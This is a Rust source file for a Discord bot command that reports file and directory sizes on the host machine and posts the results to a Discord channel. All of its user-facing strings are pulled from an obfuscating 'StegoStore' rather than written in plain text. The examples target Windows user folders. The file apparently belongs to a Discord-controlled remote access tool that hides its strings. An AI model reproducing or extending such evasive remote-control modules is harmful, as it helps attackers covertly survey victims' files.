use serde_json;
use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use walkdir::WalkDir;

pub struct SizeCommand;

impl SizeCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for SizeCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("SIZE_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "SIZE").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("SIZE_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".size C:\\Users\\Documents", ".size file.zip"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("SIZE_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("SIZE_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let path_str_owned = args.rest();
        let path_str = path_str_owned.trim();

        if path_str.is_empty() {
            http.create_message(msg.channel_id.get(), &Self::f("ERR_PROVIDE_PATH")).await?;
            return Ok(());
        }

        let path = Path::new(path_str);

        if !path.exists() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("PATH_NOT_FOUND"), path_str)).await?;
            return Ok(());
        }

        let thinking_msg = http
            .create_message(msg.channel_id.into(), &format!("{} `{}`...", Self::f("CALC_SIZE"), path_str)).await?;
        let thinking_message: Message = serde_json::from_str(&thinking_msg)?;

        let metadata = fs::metadata(path)?;

        if metadata.is_file() {
            let file_size = metadata.len();
            http.update_message(msg.channel_id, thinking_message.id, Some(format!(
                    "**{}** `{}`\n**Size:** {}",
                    Self::f("FILE_SIZE"),
                    path.display(),
                    Self::format_bytes(file_size)
                )))
                .await?;
        } else if metadata.is_dir() {
            match Self::calculate_dir_size(path) {
                Ok(result) => {
                    let mut output = format!("**{}** `{}`\n\n", Self::f("DIR_SIZE"), path.display());
                    output.push_str(&format!("**{}** {}\n", Self::f("TOTAL_SIZE"), Self::format_bytes(result.total_size)));
                    output.push_str(&format!("**{}** {}\n", Self::f("FILES"), result.file_count));
                    output.push_str(&format!("**{}** {}\n", Self::f("DIRS"), result.dir_count));
                    
                    if result.error_count > 0 {
                        output.push_str(&format!("\n??**{}** {}", Self::f("INACCESSIBLE"), result.error_count));
                    }

                    http.update_message(msg.channel_id, thinking_message.id, Some(output)).await?;
                }
                Err(_) => {
                    http.update_message(msg.channel_id, thinking_message.id, Some(Self::f("ERR_CALC_FAILED"))).await?;
                }
            }
        }

        Ok(())
    }
}

struct SizeResult {
    total_size: u64,
    file_count: usize,
    dir_count: usize,
    error_count: usize,
}

impl SizeCommand {
    fn calculate_dir_size(path: &Path) -> Result<SizeResult> {
        let mut total_size: u64 = 0;
        let mut file_count: usize = 0;
        let mut dir_count: usize = 0;
        let mut error_count: usize = 0;

        for entry in WalkDir::new(path).into_iter() {
            match entry {
                Ok(entry) => {
                    let entry_path = entry.path();
                    
                    if entry_path.is_file() {
                        match fs::metadata(entry_path) {
                            Ok(metadata) => {
                                total_size += metadata.len();
                                file_count += 1;
                            }
                            Err(_) => {
                                error_count += 1;
                            }
                        }
                    } else if entry_path.is_dir() && entry_path != path {
                        dir_count += 1;
                    }
                }
                Err(_) => {
                    error_count += 1;
                }
            }
        }

        Ok(SizeResult {
            total_size,
            file_count,
            dir_count,
            error_count,
        })
    }

    fn format_bytes(bytes: u64) -> String {
        const KB: u64 = 1024;
        const MB: u64 = KB * 1024;
        const GB: u64 = MB * 1024;
        const TB: u64 = GB * 1024;

        if bytes >= TB {
            format!("{:.2} TB ({} bytes)", bytes as f64 / TB as f64, bytes)
        } else if bytes >= GB {
            format!("{:.2} GB ({} bytes)", bytes as f64 / GB as f64, bytes)
        } else if bytes >= MB {
            format!("{:.2} MB ({} bytes)", bytes as f64 / MB as f64, bytes)
        } else if bytes >= KB {
            format!("{:.2} KB ({} bytes)", bytes as f64 / KB as f64, bytes)
        } else {
            format!("{} bytes", bytes)
        }
    }
}
